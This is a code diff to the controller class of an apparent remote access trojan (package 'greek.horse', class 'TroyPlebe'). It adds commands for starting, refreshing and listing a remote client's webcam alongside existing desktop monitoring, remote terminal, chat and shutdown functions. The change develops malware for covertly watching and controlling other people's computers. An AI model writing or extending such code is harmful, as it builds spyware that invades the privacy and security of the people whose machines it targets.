@@ -7,6 +7,7 @@ import greek.horse.server.troyStructure.request.UniqueTroyRequest;
 import greek.horse.server.ui.controllers.tasks.ChatTask;
 import greek.horse.server.ui.controllers.tasks.MonitorDesktopTask;
 import greek.horse.server.ui.controllers.tasks.TerminalTask;
+import greek.horse.server.ui.controllers.tasks.WebcamTask;
 
 import java.io.Serializable;
 import java.nio.file.Path;
@@ -21,9 +22,10 @@ public class TroyPlebe {
     private CopyOnWriteArrayList<TroyRequest> requests = new CopyOnWriteArrayList<>();
     private static final Serializable EMPTY = "";
 
-    private ChatTask chatTask = new ChatTask(this);
-    private MonitorDesktopTask monitorDesktopTask = new MonitorDesktopTask(this);
-    private TerminalTask terminalTask = new TerminalTask(this);
+    private final ChatTask chatTask = new ChatTask(this);
+    private final MonitorDesktopTask monitorDesktopTask = new MonitorDesktopTask(this);
+    private final TerminalTask terminalTask = new TerminalTask(this);
+    private final WebcamTask webcamTask = new WebcamTask(this);
 
     public TroyPlebe(String id) {
         this.id = id;
@@ -70,8 +72,14 @@ public class TroyPlebe {
         requests.add(req);
     }
 
-    public RecurrentTroyRequest startScreenCapture(MonitorDesktopWrapper wrapper) {
+    public RecurrentTroyRequest startDesktop(MonitorDesktopWrapper wrapper) {
         RecurrentTroyRequest req = new RecurrentTroyRequest(wrapper, RequestFunctionType.DESKTOP_START);
+        requests.add(req);
+        return req;
+    }
+
+    public RecurrentTroyRequest startWebcam(WebcamInfoWrapper wrapper) {
+        RecurrentTroyRequest req = new RecurrentTroyRequest(wrapper, RequestFunctionType.WEBCAM_START);
         requests.add(req);
         return req;
     }
@@ -172,6 +180,11 @@ public class TroyPlebe {
         requests.add(req);
     }
 
+    public void refreshWebcam(WebcamInfoWrapper wrapper) {
+        UniqueTroyRequest req = new UniqueTroyRequest(this, wrapper, RequestFunctionType.WEBCAM_REFRESH, false);
+        requests.add(req);
+    }
+
     public void turnOff() {
         UniqueTroyRequest req = new UniqueTroyRequest(this, EMPTY, RequestFunctionType.TURN_OFF, false);
         requests.add(req);
@@ -183,7 +196,11 @@ public class TroyPlebe {
         return req;
     }
 
-
+    public UniqueTroyRequest getWebcamCount() {
+        UniqueTroyRequest req = new UniqueTroyRequest(this, EMPTY, RequestFunctionType.WEBCAM_LIST, true);
+        requests.add(req);
+        return req;
+    }
 
     @Override
     public String toString() {
@@ -226,4 +243,9 @@ public class TroyPlebe {
     public TerminalTask getTerminalTask() {
         return terminalTask;
     }
+
+    public WebcamTask getWebcamTask() {
+        return webcamTask;
+    }
+
 }
